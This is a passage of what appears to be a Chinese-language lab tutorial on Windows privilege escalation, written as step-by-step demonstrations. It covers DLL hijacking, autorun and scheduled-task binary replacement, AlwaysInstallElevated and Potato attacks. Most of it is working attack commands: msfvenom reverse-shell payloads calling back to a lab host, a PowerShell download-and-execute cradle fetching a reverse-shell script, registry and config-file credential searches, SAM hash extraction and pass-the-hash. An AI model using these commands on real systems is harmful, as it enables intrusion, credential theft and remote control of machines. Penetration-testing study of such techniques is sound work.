+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">copy &quot;C:\Program Files\File Permissions Service\filepermservice.exe&quot; C:\Temp</span><br><span class="line">copy &#x2F;Y C:\PrivEsc\reverse.exe &quot;C:\Program Files\File Permissions Service\filepermservice.exe&quot;</span><br></pre></td></tr></table></figure>
+
+<p>开启监听，启动服务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net start filepermsvc</span><br></pre></td></tr></table></figure>
+
+<p>![23](/images/windows privilege escalation/23.png)</p>
+<h4 id="DLL-Hijacking"><a href="#DLL-Hijacking" class="headerlink" title="DLL Hijacking"></a>DLL Hijacking</h4><p>通常服务会从DLL库中加载功能。无论DLL提供什么样的功能，都将与加载它的服务以相同的权限执行。<br>如果一个DLL使用绝对路径加载的，而且我们可以对他进行写入，那么可能可以用来进行提权</p>
+<p>(补充:一种更常见的利用DLL劫持的错误配置使，系统中缺少了某个DLL库，当前用户Windows搜索DLL的PATH内的目录拥有写入权限。但这种漏洞很难被发现，而且整个发现和利用过程都需要手动进行)</p>
+<p>演示</p>
+<ol>
+<li>winpeas枚举</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\winpeas.exe quiet servicesinfo</span><br></pre></td></tr></table></figure>
+
+<p>在Interesting Services -non Microsoft条目下发现一些服务，并在PATH中发现了我们可以拥有写权限的目录<code>C:\Temp</code>，这可能会导致DLL劫持</p>
+<p>![24](/images/windows privilege escalation/24.png)</p>
+<ol start="2">
+<li>检查我们是否能够启动/停止服务</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\accesschk.exe &#x2F;accepteula -uvqc dllsvc</span><br></pre></td></tr></table></figure>
+
+<p>![25](/images/windows privilege escalation/25.png)</p>
+<ol start="3">
+<li>查看服务配置</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc qc dllsvc</span><br></pre></td></tr></table></figure>
+
+<p>![26](/images/windows privilege escalation/26.png)</p>
+<p>找到了文件的执行路径，并且该服务以SYSTEM权限运行</p>
+<ol start="4">
+<li>分析该文件</li>
+</ol>
+<p>正常情况下，拷贝这个可执行文件到另一台我们拥有Admin权限的机器上进行分析。<br>这里为了演示，我们直接在这台机器上以Admin身份进行分析</p>
+<p>直接以Administrator身份运行Procmon<br>关闭抓取，并清空记录</p>
+<p>![27](/images/windows privilege escalation/27.png)</p>
+<p>Ctrl+L进入过滤规则设置，添加规则，输入我们刚刚找到程序的名字</p>
+<p>![28](/images/windows privilege escalation/28.png)</p>
+<p>关闭注册表检测和网络检测，并开启抓取</p>
+<p>![29](/images/windows privilege escalation/29.png)</p>
+<p>之后开启服务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net start dllsvc</span><br></pre></td></tr></table></figure>
+
+<p>![30](/images/windows privilege escalation/30.png)</p>
+<p>关注到<code>NAME NOT FOUND</code>列，这是Windows尝试在目录中寻找的DLL库文件<br>其中<code>C:\Temp\</code>目录是我们之前找到我们可以写入的目录，并且程序在寻找<code>hijackme.dll</code></p>
+<p>5.在kali中生成reverse_shell的dll文件，并传输到目标机器上</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;shell_reverse_tcp LHOST&#x3D;192.168.110.3 LPORT&#x3D;53 -f dll -o hijackme.dll</span><br></pre></td></tr></table></figure>
+
+<ol start="6">
+<li>开启端口监听，启动服务</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net stop dllsvc</span><br><span class="line">net start dllsvc</span><br></pre></td></tr></table></figure>
+
+<p>![31](/images/windows privilege escalation/31.png)</p>
+<h2 id="Registry"><a href="#Registry" class="headerlink" title="Registry"></a>Registry</h2><h3 id="Autoruns"><a href="#Autoruns" class="headerlink" title="Autoruns"></a>Autoruns</h3><p>windows可以通过开机时候启动的应用进行提权。这些自启动的程序可以在注册表进行设置，如果你能够修改这些AutoRun的可执行程序并且能够重启机器，可能会得到提权</p>
+<p>演示</p>
+<ol>
+<li>winpeas枚举</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winpeas quiet applicationsinfo</span><br></pre></td></tr></table></figure>
+
+<p>![32](/images/windows privilege escalation/32.png)</p>
+<p>发现了可以修改的Autorun程序，并给出了RegPath</p>
+<ol start="2">
+<li>手动枚举该注册表</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><br></pre></td></tr></table></figure>
+
+<p>![33](/images/windows privilege escalation/33.png)</p>
+<ol start="3">
+<li>accesschk逐一检查每个执行文件的权限</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\accesschk.exe&#x2F;accepteula -wvu &quot;C:\Program Files\Autorun Program\program.exe&quot;</span><br></pre></td></tr></table></figure>
+
+<p>![34](/images/windows privilege escalation/34.png)</p>
+<p>检查发现了一个可以修改的可执行程序</p>
+<ol start="4">
+<li>在真实的渗透中，我们应该备份该文件，接着用我们的reverse_shell的exe文件进行替换</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">copy &quot;C:\Program Files\Autorun Program\program.exe&quot; C:\Temp</span><br><span class="line">copy &#x2F;Y C:\PrivEsc\reverse.exe &quot;C:\Program Files\Autorun Program\program.exe&quot;</span><br></pre></td></tr></table></figure>
+
+<ol start="5">
+<li>开启监听，注意这里程序自启动的权限是最后一次的登陆者的权限，这意味着如果上一次登录者为Administrator，我们就可以提权，反之则不能<br>(在实验环境中，退出User的登录，以Administrator登录，并重启)<br>开机后，就可以获得上一次登录的权限，这里为Administrator</li>
+</ol>
+<p>![35](/images/windows privilege escalation/35.png)</p>
+<h3 id="AlwaysInstallElevated"><a href="#AlwaysInstallElevated" class="headerlink" title="AlwaysInstallElevated"></a>AlwaysInstallElevated</h3><p>.msi格式的安装包被用来安装应用，这些文件会在尝试安装它们的用户权限下运行。<br>windows允许正常用户提升权限(即admin)来安装应用，这种情况我们可以生成制作好的恶意msi文件</p>
+<p>这种提权需要满足两个注册表值的设定<br>在本地计算机和本地用户的注册表中，AlwaysInstallElevated必须设置为1</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer</span><br><span class="line">HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer</span><br></pre></td></tr></table></figure>
+
+<p>如果其中一项没设置，利用就无法完成</p>
+<p>演示</p>
+<ol>
+<li>winpeas枚举</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winpeas quiet windowscreds</span><br></pre></td></tr></table></figure>
+
+<p>![36](/images/windows privilege escalation/36.png)</p>
+<p>发现两处值都已设为1</p>
+<ol start="2">
+<li>手动检查注册表</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer &#x2F;v AlwaysInstallElevated</span><br><span class="line">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer &#x2F;v AlwaysInstallElevated</span><br></pre></td></tr></table></figure>
+
+<p>![37](/images/windows privilege escalation/37.png)</p>
+<ol start="3">
+<li>生成一个恶意msi文件</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;shell_reverse_tcp LHOST&#x3D;192.168.110.3 LPORT&#x3D;53 -f msi -o reverse.msi</span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li>传输恶意文件，开启端口监听，运行安装程序触发漏洞利用</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msiexec &#x2F;quiet &#x2F;qn &#x2F;i C:\PrivEsc\reverse.msi</span><br></pre></td></tr></table></figure>
+
+<p>![38](/images/windows privilege escalation/38.png)</p>
+<h2 id="Passwords"><a href="#Passwords" class="headerlink" title="Passwords"></a>Passwords</h2><h3 id="Registry-1"><a href="#Registry-1" class="headerlink" title="Registry"></a>Registry</h3><p>管理员可能会重用某些密码，或者将密码存放在系统的可读位置上，windows容易收到此类攻击，因为windows有多个功能会不安全的存储密码</p>
+<p>许多程序会在注册表中存放设置选项，windows本身有时也会在注册表中以明文形式存放密码，所以我们应该尝试在注册表中搜索密码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg query HKLM &#x2F;f password &#x2F;t REG_SZ &#x2F;s</span><br><span class="line">reg query HKCU &#x2F;f password &#x2F;t REG_SZ &#x2F;s</span><br></pre></td></tr></table></figure>
+
+<p>第一个搜索本地机器，第二搜索本地用户。这两个命令会有大量输出，因此需要查看更加常用的位置</p>
+<p>演示</p>
+<ol>
+<li>winpeas枚举</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winpeas.exe quiet filesinfouserinfo</span><br></pre></td></tr></table></figure>
+
+<p>![39](/images/windows privilege escalation/39.png)</p>
+<p>![40](/images/windows privilege escalation/40.png)</p>
+<p>我们发现了Admin用户的AutoLogon credentials和Putty session</p>
+<ol start="2">
+<li>对两者进行手动枚举</li>
+</ol>
+<p>AutoLogon credentials</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon&quot;</span><br></pre></td></tr></table></figure>
+
+<p>![41](/images/windows privilege escalation/41.png)</p>
+<p>Putty session</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKCU\Software\SimonTatham\PuTTY\Sessions&quot; &#x2F;s</span><br></pre></td></tr></table></figure>
+
+<p>![42](/images/windows privilege escalation/42.png)</p>
+<ol start="3">
+<li>使用这些凭据，我们可以基于对方的SMB服务进行提权</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winexe -U &#39;admin%password123&#39; &#x2F;&#x2F;192.168.110.9 cmd.exe</span><br></pre></td></tr></table></figure>
+
+<p>![43](/images/windows privilege escalation/43.png)</p>
+<p>既然这个凭据可以成功提权admin，那么可以使用–system参数，来获取system权限</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winexe -U &#39;admin%password123&#39; --system &#x2F;&#x2F;192.168.110.9 cmd.exe</span><br></pre></td></tr></table></figure>
+
+<p>补充:powershell使用凭据反弹的方式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$SecPass &#x3D; ConvertTo-SecureString &#39;password123&#39; -AsPlainText -Force</span><br><span class="line">$cred &#x3D; New-Object System.Management.Automation.PSCredential(&#39;admin&#39;, $SecPass)</span><br><span class="line">Start-Process -FilePath &quot;powershell&quot; -argumentlist &quot;iex(new-object net.webclient).downloadString(&#39;http:&#x2F;&#x2F;192.168.110.3&#x2F;winpriv&#x2F;Invoke-PowerShellTcp.ps1&#39;)&quot; -Credential $cred</span><br></pre></td></tr></table></figure>
+
+<p><strong>补充说明</strong>:凭据会保存很多位置，winpeas会自动检索常用的一些位置</p>
+<p>我们可以以password为关键词，手动搜索注册表，检索键名或键值中出现这个词的地方</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg query HKLM &#x2F;f password &#x2F;t REG_SZ &#x2F;s</span><br><span class="line">reg query HKCU &#x2F;f password &#x2F;t REG_SZ &#x2F;s</span><br></pre></td></tr></table></figure>
+
+<h3 id="Saved-Creds"><a href="#Saved-Creds" class="headerlink" title="Saved Creds"></a>Saved Creds</h3><p>Windows中有一个Runas命令，它允许用户使用其他用户的权限运行命令。这通常需要知道其他用户的密码。<br>但是，Windows还允许用户将凭据保存到系统中，我们可以发现这些保存的凭据，并使用它们绕过</p>
+<p>演示</p>
+<ol>
+<li>winpeas枚举</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winpeas.exe quiet cmd windowscreds</span><br></pre></td></tr></table></figure>
+
+<p>![44](/images/windows privilege escalation/44.png)</p>
+<p>发现了管理用户保存的凭据</p>
+<ol start="2">
+<li>手动枚举</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmdkey &#x2F;list</span><br></pre></td></tr></table></figure>
+
+<p>![45](/images/windows privilege escalation/45.png)</p>
+<ol start="3">
+<li>我们可以使用保存的凭据以管理员身份运行任何文件，这里我们在kali开启监听，运行reverse_shell</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">runas &#x2F;savecred &#x2F;user:admin C:\PrivEsc\reverse.exe</span><br></pre></td></tr></table></figure>
+
+<p>![46](/images/windows privilege escalation/46.png)</p>
+<h3 id="Configuration-Files"><a href="#Configuration-Files" class="headerlink" title="Configuration Files"></a>Configuration Files</h3><p>一些管理员会将密码保存在某些配置文件上，比如Unattend.xml，它允许windows进行自动化设置，所以上面基本可以确认存有密码</p>
+<h4 id="寻找配置文件"><a href="#寻找配置文件" class="headerlink" title="寻找配置文件"></a>寻找配置文件</h4><p>在当前目录递归搜索，以pass或.config为结尾的文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir &#x2F;s *pass* &#x3D;&#x3D; *.config</span><br></pre></td></tr></table></figure>
+
+<p>在当前目录递归搜索，包含单词password，并且以.xml,.ini或.txt为结尾的文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">findstr &#x2F;si password *.xml *.ini *.txt</span><br></pre></td></tr></table></figure>
+
+<p>演示</p>
+<ol>
+<li>winpeas枚举</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winpeas quiet cmd searchfast filesinfo</span><br></pre></td></tr></table></figure>
+
+<p>关注<code>Searching known files that can contain creds</code> 条目下输出的文件</p>
+<ol start="2">
+<li>手动进行检查即可，看是否存有凭据</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type FILE_LOCATION</span><br></pre></td></tr></table></figure>
+
+<h3 id="SAM"><a href="#SAM" class="headerlink" title="SAM"></a>SAM</h3><p>Windows将密码的哈希存放在SAM中。这些哈希使用密钥加密，可以在SYSTEM文件中找到密钥。<br>如果可以读取SAM和SYSTEM文件，则可以提取哈希</p>
+<p>SAM和SYSTEM文件存放在<code>C:\Windows\System32\config</code>目录下。这两个文件会在windows运行时锁定。<br>存心的管理员会把它备份存储在一些位置如<code>C:\Windows\Repair</code>或<code>C:\Windows\System32\config\RegBack</code></p>
+<p>演示(假设发现了备份文件)</p>
+<ol>
+<li><p>将SAM和SYSTEM文件传输到Kali中</p>
+</li>
+<li><p>下载pwdump<a target="_blank" rel="noopener" href="https://github.com/Neohapsis/creddump7">https://github.com/Neohapsis/creddump7</a><br>获取LM和NTLM哈希</p>
+</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 creddump7&#x2F;pwdump.pySYSTEM SAM</span><br></pre></td></tr></table></figure>
+
+<p>可以尝试破解，也可以尝试哈希传递攻击</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pth-winexe --system -U &#39;admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da&#39; &#x2F;&#x2F;192.168.110.9 cmd.exe</span><br></pre></td></tr></table></figure>
+
+<p>![47](/images/windows privilege escalation/47.png)</p>
+<h2 id="Scheduled-Tasks"><a href="#Scheduled-Tasks" class="headerlink" title="Scheduled Tasks"></a>Scheduled Tasks</h2><p>windows可以设置计划任务在一个特定时间执行(比如每5分钟)或者在某些事件触发时执行(比如用户登录)。<br>计划任务的运行权限通常是创建它们的用户权限，但是管理员可以将它们设置为以其他身份运行，包括SYSTEM用户</p>
+<p>不幸的是，没有一种简单的方法可以在一个低权限的用户下枚举其他用户计划任务的方法</p>
+<p>你可以枚举所有计划任务</p>
+<p>CMD</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks &#x2F;query &#x2F;fo LIST &#x2F;v</span><br></pre></td></tr></table></figure>
+
+<p>Powershell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ScheduledTask | where &#123;$_.TaskPath -notlike &quot;\Microsoft*&quot;&#125; | ft TaskName,TaskPath,State</span><br></pre></td></tr></table></figure>
+
+<p>通常，我们需要依赖其他先锁， 比如计划任务的执行脚本或日志文件</p>
+<p>演示</p>
+<ol>
+<li>假设发现了一个计划任务脚本，查看它的源码</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\DevTools\CleanUp.ps1</span><br></pre></td></tr></table></figure>
+
+<p>![48](/images/windows privilege escalation/48.png)</p>
+<p>从中发现它运行在SYSTEM权限下</p>
+<ol start="2">
+<li>检查文件权限</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\accesschk.exe &#x2F;accepteula -quvw user &quot;C:\DevTools\CleanUp.ps1&quot;</span><br></pre></td></tr></table></figure>
+
+<p>![49](/images/windows privilege escalation/49.png)</p>
+<p>发现具有文件写入权限</p>
+<ol start="3">
+<li>真实渗透中，备份该文件</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy C:\DevTools\CleanUp.ps1 C:\Temp\</span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li><p>kali开启监听</p>
+</li>
+<li><p>使用echo命令，调用reverse.exe的语句追加到该脚本中</p>
+</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo C:\PrivEsc\reverse.exe &gt;&gt; C:\DevTools\CleanUp.ps1</span><br></pre></td></tr></table></figure>
+
+<p>![50](/images/windows privilege escalation/50.png)</p>
+<ol start="6">
+<li>耐心等待计划任务执行，就可以获得reverse_shell了</li>
+</ol>
+<p>![51](/images/windows privilege escalation/51.png)</p>
+<h2 id="Insecure-GUI-Apps-Citrix-Method"><a href="#Insecure-GUI-Apps-Citrix-Method" class="headerlink" title="Insecure GUI Apps (Citrix Method)"></a>Insecure GUI Apps (Citrix Method)</h2><p>在某些(旧)版本的windows中，用户可以被授予权限，可以以管理员身份运行某些GUI程序<br>我们有很多种方法可以在GUI中生成命令提示符，包括使用windows本身的功能。<br>由于GUI父进程以管理员权限运行，因此生成的命令提示符也会以管理员权限运行。这称为<code>Citrix Method</code>，因为它使用了许多与Citrix环境相同的技术</p>
+<p>演示</p>
+<ol>
+<li>以user权限GUI登录到windows中</li>
+<li>在桌面发现了名为AdminPaint的快捷方式，运行它</li>
+</ol>
+<p>![52](/images/windows privilege escalation/52.png)</p>
+<ol start="3">
+<li>枚举该进程的运行权限</li>
+</ol>
+<p>![53](/images/windows privilege escalation/53.png)</p>
+<p>发现其运行在admin权限下</p>
+<ol start="4">
+<li>点击左上角FIle→Open→打开文件输入file://c:/windows/system32/cmd.exe，接着不要点击Open，直接敲击回车</li>
+</ol>
+<p>![54](/images/windows privilege escalation/54.png)</p>
+<ol start="5">
+<li>生成高权限shell</li>
+</ol>
+<p>![55](/images/windows privilege escalation/55.png)</p>
+<h2 id="Startup-Apps"><a href="#Startup-Apps" class="headerlink" title="Startup Apps"></a>Startup Apps</h2><p>每个用户都可以通过将快捷方式放置在特定目录中定义在登录时启动的应用程序<br>Windows提供了启动目录来存放启动程序，并会在任何用户登录时启动</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</span><br></pre></td></tr></table></figure>
+
+<p>如果我们可以在此目录中创建文件，则可以在管理员登录时加载reverse_shell可执行文件，来进行提权</p>
+<p>注意，必须使用快捷方式文件(.lnk)。我们将使用一个VBScript来创建快捷方式文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Set oWS &#x3D; WScript.CreateObject(&quot;WScript.Shell&quot;)</span><br><span class="line">sLinkFile &#x3D; &quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk&quot;</span><br><span class="line">Set oLink &#x3D; oWS.CreateShortcut(sLinkFile)</span><br><span class="line">oLink.TargetPath &#x3D; &quot;C:\PrivEsc\reverse.exe&quot;</span><br><span class="line">oLink.Save</span><br></pre></td></tr></table></figure>
+
+<p>演示</p>
+<p>accesschk检查StartUp目录当前用户权限</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\accesschk.exe &#x2F;accepteula -d &quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp&quot;</span><br></pre></td></tr></table></figure>
+
+<p>![56](/images/windows privilege escalation/56.png)</p>
+<p>我们发现它允许BUILTIN\Users进行RW权限，即我们用户所在组</p>
+<p>创建刚刚VBScript脚本文件，并执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript CreateShortcut.vbs</span><br></pre></td></tr></table></figure>
+
+<p>![57](/images/windows privilege escalation/57.png)</p>
+<p>kali开启监听，当admin账户登录到该机器时，我们可以获得提权</p>
+<p>![58](/images/windows privilege escalation/58.png)</p>
+<h2 id="Installed-Applications"><a href="#Installed-Applications" class="headerlink" title="Installed Applications"></a>Installed Applications</h2><p>第三方安装应用的提权方式，大多数会基于前面已经介绍过的漏洞进行提权。不过仍然会有如缓冲区溢出等原因导致的某些权限提升，因此我们需要准确枚举出已安装的第三方应用以及寻找公开漏洞</p>
+<p>枚举当前运行的应用程序</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist &#x2F;v</span><br></pre></td></tr></table></figure>
+
+<p>使用seabelt来枚举非标准程序</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\seatbelt.exe NonstandardProcesses</span><br></pre></td></tr></table></figure>
+
+<p>winpeas枚举(注意它这里prcesinfo就用拼错的)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\winpeas.exe quiet procesinfo</span><br></pre></td></tr></table></figure>
+
+<p>检查上面工具的所有输出，一旦找到有趣的进程后，尝试确认它的版本。你可以尝试执行它的可执行文件，并使用<code>/?</code>或<code>-h</code>，同时检查该程序所在目录的一些配置文件。接着寻找公开漏洞利用，编译并运行利用程序</p>
+<h2 id="土豆家族"><a href="#土豆家族" class="headerlink" title="土豆家族"></a>土豆家族</h2><p>土豆家族的攻击原理非常有趣，以后再写更详细的攻击原理</p>
+<h3 id="Hot-Potato"><a href="#Hot-Potato" class="headerlink" title="Hot Potato"></a>Hot Potato</h3><p>Hot Patato是一个攻击工具，简单来说它通过进行NTLM重放攻击完成欺骗攻击，可以获得SYSTEM权限。该攻击诱使Windows使用NTLM用户身份验证到伪造的HTTP服务器，接着将NTLM凭据重放到SMB，从而达到命令执行。这种攻击适用于windows7、8和部分早期版本的windows10</p>
+<p>针对不同版本的windows会有不同的参数，这里演示的是win7</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.\potato.exe -ip 192.168.1.33 -cmd &quot;C:\Users\test7sp1\Desktop\reverse.exe&quot; -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true</span><br><span class="line">ip     本机的ip</span><br><span class="line">cmd    想执行的命令</span><br></pre></td></tr></table></figure>
+
+<h3 id="Service-Accounts-Rotten-Juicy-Potato"><a href="#Service-Accounts-Rotten-Juicy-Potato" class="headerlink" title="Service Accounts (Rotten / Juicy Potato)"></a>Service Accounts (Rotten / Juicy Potato)</h3><p>回顾一下服务账号的特性，对于其账号关联的服务有特殊的权限，不可以直接登录。服务账号可以用来进行提权</p>
+<p>2016年发现了Rotten Potato进行提权，服务账户可以盗取SYSTEM的票据并假冒SYSTEM用户，这个利用需要开启SeImpersonatePrivilege</p>
+<p>之后的Juicy Potato是Rotten Potato的升级版，运作原理相同，但提供了更多的利用方式</p>
+<p><strong>记住</strong>，这种攻击的对象是服务账户</p>
+<p>演示，这里还是windows7环境</p>
+<p>我们先要获取一个服务账户的shell，在kali中开启监听，以admin身份登录windows7，使用psexec切换账户，并运行反弹shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\PrivEsc\PSExec64.exe -i -u &quot;ntauthority\local service&quot; C:\PrivEsc\reverse.exe</span><br></pre></td></tr></table></figure>
+
+<p>现在我们就获得了服务账户的shell</p>
+<ol>
+<li>手动枚举权限</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt;whoami &#x2F;priv</span><br><span class="line">SeImpersonatePrivilege		Enabled</span><br></pre></td></tr></table></figure>
+
+<p>确认SeImpersonatePrivilege为开启</p>
+<ol start="2">
+<li>kali开启监听，使用juicy potato</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\PrivEsc\JuicyPotato.exe -l 1337 -p C:\PrivEsc\reverse.exe -t * -c &#123;03ca98d6-ff5d-49b8-abc6-03dd84127020&#125;</span><br><span class="line">-l		指定端口，必须不能被使用</span><br><span class="line">-p		指定命令</span><br><span class="line">-c		指定一个该windows中存在的clsid</span><br></pre></td></tr></table></figure>
+
+<p>这样就能获取SYSTEM权限的shell</p>
+<h2 id="Port-Forwarding"><a href="#Port-Forwarding" class="headerlink" title="Port Forwarding"></a>Port Forwarding</h2><p>有时候易受攻击的端口只在内部监听，在这种情况下，我们需要使用远程端口转发，可以使用plink</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd &#x2F;c &quot;echo y|C:\Windows\Temp\plink64.exe -l root -pw toor -R &lt;kali-port&gt;:&lt;target-IP&gt;:&lt;target-port&gt;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>通常target-IP输入的是127.0.0.1</p>
+<h1 id="额外部分"><a href="#额外部分" class="headerlink" title="额外部分"></a>额外部分</h1><h3 id="Meterpreter-gt-getsystem"><a href="#Meterpreter-gt-getsystem" class="headerlink" title="Meterpreter&gt;getsystem"></a>Meterpreter&gt;getsystem</h3><p>首先介绍几个概念</p>
+<p><strong>Access Tokens</strong></p>
+<p>访问令牌是windows中的特殊对象，它用来存储用户的身份和权限。有两种Access Tokens<br>PrimaryAccess Token:用户登录时创建，并绑定到当前用户会话。当用户启动一个新的程序，这个访问令牌会被复制并被新的程序所加载。这就表示这个程序会运行在这个用户Token所在的权限<br>ImpersonationAccess Token:在进程或线程需要安全的使用其他用户的上下文运行时，被临时创建</p>
+<p>windows允许进程或线程复制访问令牌，所以ImpersonationAccess Token可以被复制成PrimaryAccess Token<br>如果我们可以注入一个进程，我们可以使用此功能来复制该进程的令牌，然后使用此令牌来产生另一个相同权权限的单独进程</p>
+<p><strong>Named Pipes</strong></p>
